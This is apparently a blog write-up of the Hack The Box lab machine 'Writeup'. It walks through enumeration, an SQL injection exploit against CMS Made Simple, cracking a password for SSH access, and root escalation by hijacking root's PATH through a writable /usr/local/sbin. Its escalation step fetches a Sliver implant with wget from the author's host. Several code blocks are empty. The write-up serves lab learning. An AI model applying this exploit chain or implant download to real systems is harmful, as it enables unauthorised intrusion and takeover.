# Enumeration

As usual, let's start with a simple ping of the server.

``` bash
┌──(root💀bradman)-[/home/brad/HTB/Writeup]
└─# ping -c 5 10.10.10.138

```

As like we did with [Bastion](/_posts/2021-07-14-bastion.md), let's look at the `ttl` and make a guestimate as to what we're attacking. We'll be using [subinsb.com](https://subinsb.com/default-device-ttl-values/), which shows that this is most likely a *nix machine.

We'll utilize [nmapper](https://github.com/ABradRoberts/nmapper/blob/master/src/nmapper.sh) and to enumerate this machine further.

```

We're only working with 2 ports, 22(ssh) and 80(http), that makes our jobs pretty easy because we know there has to be something in one of these, let's start with the web application on 80 because I love web apps - they're the modern day "binaries to reverse" but more fun.

We'll use FeroxBuster cause I'm freaking loving that tool!

[ 2 hours later ]

Well... sometimes it's good to just visit the webpage or `curl` it before trying a web fuzzing tool like this.... because we get the following:

``` bash

Prolly explains why feroxbuster was *crawling* and why gobuster just kept erroring out... lol... welp... LET'S DO IT LIVE!

Let's check for `robots.txt` this will tell us what the developers specifically want targeted by search engine web crawlers. This can also be used to say which pages are "disallowed" from this list too. In our case, we see the following:

``` bash
┌──(root💀bradman)-[/home/brad/HTB/Writeup]
└─# curl http://10.10.10.138/robots.txt

#      _(\    |@@|

#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

Okay, so they disallow `/writeup/` let's navigate there and see what it's housing.

<img alt="index.html" src="/assets/images//writeup/writeup_index.png">

Looking around at this page there doesn't seem to be anything blaring at us, so let's look at the page source. Maybe there is something interesting in the html.

``` html
<!doctype html>
<html lang="en_US"><head>
	<title>Home - writeup</title>
	
<base href="http://10.10.10.138/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

	<!-- cms_stylesheet error: No stylesheets matched the criteria specified -->

    <-- OMIT FOR BREVITY-->

```

Looks like it's using CMS, let's go ahead and run this through `searchsploit`.

Running `searchsploit cms` and `searchsploit cms made simple` yields a TON of results... we need to scope this down a little bit, we know that it's copyright 2004-2019, let's google and see what version came out in 2019. 

<img alt="googling" src="/assets/images//writeup/google_version.png">

Well, we *should* go in and dig a little bit further but it appears that version 2.2.X keeps coming up for a search for the 2019 version. Let's use this to see if we can narrow down `searchsploit` more

``` bash
┌──(root💀bradman)-[/home/brad/HTB/Writeup]

```

Nice! Now we can really work with that. First thoughts looking at this - Remote Code execution would be AWESOME... buuut it's authenticated so I'm going to look at the SQL injection vulnerabilities first. We can nix the 1.2.2 version and jump straight into our 2.2.10 version.

We can copy this exploit using the `-m` flag in `searchsploit`!

``` bash
┌──(root💀bradman)-[/home/brad/HTB/Writeup]
└─# searchsploit -m php/webapps/46635.py -o sploit.py
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection

Copied to: /home/brad/HTB/Writeup/sploit.py


┌──(root💀bradman)-[/home/brad/HTB/Writeup]
└─# ls
sploit.py  nmap
```

I would HIGHLY recommend reading through the code and getting a fairly solid understanding of how it works and what it does before actually executing - I'd say I spent about 30 minutes reading this before actually executing this on MY machine.
(also this code is freaking cool.... reading it is.. meh.. but seeing it work and then re-reading it is super cool, literally feels like a 90's hacker movie... let's be honest... even modern hacker movies :/ )

<br>

# Exploitation
---

We run the exploit code in the following manner and wait like 5 minutes then get the below result:

``` bash
┌──(root💀bradman)-[/home/brad/HTB/Writeup]

```

We got a password and the salt... let's combine these and run it through `hashcat`:

``` bash

We cracked the password! It's `raykayjay9`, let's use this to ssh into the server as `jkr` like we found above.

``` bash

NICE! We're in, let's privesc now!

# Escalation
---

Okay, not going to lie, I got super stuck on this - needed to read a walkthrough myself! 
> I just want anyone who reads this that imposter syndrome is real.... and that it's perfectly okay to go to writeups as long as you're not just "grepping" for the flags. Writeups are in place to learn, so use them :D

Okay, moving on, so running `sudo -l` shows the following:

``` bash
jkr@writeup:~$ sudo -l
-bash: sudo: command not found
```

Ouch... what luck. At this point we can do a handful of things, we can run tools such as [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)or [linenum.sh](https://github.com/rebootuser/LinEnum) to see if we can't catch an easy win.

However, I'm not going to use that, I got to learn some new techniques from a different writeup so I'm going to go through those! :)

Okay, so, let's look at who we are and get better situational awareness:

``` bash
jkr@writeup:~$ whoami
jkr
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
jkr@writeup:~$ uname -a
Linux writeup 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
```

We're on a Debian machine, not a super big deal but we can see what groups we're a part of, we can cross-check these groups in the [Debian Wiki](https://wiki.debian.org/SystemGroups) to see what's standard. We find 1 group that's interesting, `staff`:

> **staff:** Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may "override" the executables in /bin and /usr/bin with the same name). Compare with group "adm", which is more related to monitoring/security. 

``` bash
jkr@writeup:~$ ls -ld /usr/local/bin
drwx-wsr-x 2 root staff 20480 Apr 19  2019 /usr/local/bin
```

So, /usr/local/bin is actually in root's path by default, so if we can find something that root is calling (maybe a cron job? or for "real" engagements with humans sometimes interacting with the server as root, maybe `ls`?). If we find that root is running something we can replace that program with our own program since we have write rights to this directory since we're part of `staff`.

Using a program called [pspy](https://github.com/DominicBreuker/pspy) we can watch as processes execute on the machine - even processes running from root.

``` bash

Okay, so we see that a cron job runs every minute that runs `/bin/sh -c /root/bin/cleanup.pl` - not super interesting because there doesn't appear to be anything that we can hijack. However, if we leave this running, and open a new SSH connection we get the following:

``` bash
2021/07/24 17:50:58 CMD: UID=102  PID=2303   | sshd: [net]       
2021/07/24 17:51:01 CMD: UID=0    PID=2304   | /usr/sbin/CRON

2021/07/24 17:51:08 CMD: UID=1000 PID=2314   | -bash 
```

I could be mistaken, but I'm pretty sure it isn't incredibly uncommon for scripts/commands to run on ssh-startup.

Anyway, the interesting part is that we see root's PATH, which contains `/usr/local/bin` which we can write to. Then root calls a program `run-parts` without specifying the path, not it's possible that `run-parts` is in `/usr/local/sbin` buuuuuut.... we can write to that too!

``` bash
jkr@writeup:~$ ls -ld /usr/local/sbin
drwx-wsr-x 2 root staff 12288 Apr 19  2019 /usr/local/sbin
```

Alright, here's the idea, if we can create a program in `/usr/local/sbin` called `run-parts` and assuming it's not already housed there... when we log in with SSH it'll actually run OUR version, which is whatever we wrote. Let's set Bishop Fox's [Sliver](https://github.com/BishopFox/sliver), generate an implant, send it to the machine and move that implant to `/usr/local/sbin/run-parts`!

``` bash
jkr@writeup:/tmp$ wget http://10.10.16.205:8080/writeup

```

Alright, I had to do this a few times because it kept disappearing... wondering if that cron job is to blame... hmmm.. anyway, after quickly adding the implant then relogging back into the machine we got our root shell!

``` bash

There we have it! Got both flags and learned something along the way. Thanks for reading! :)
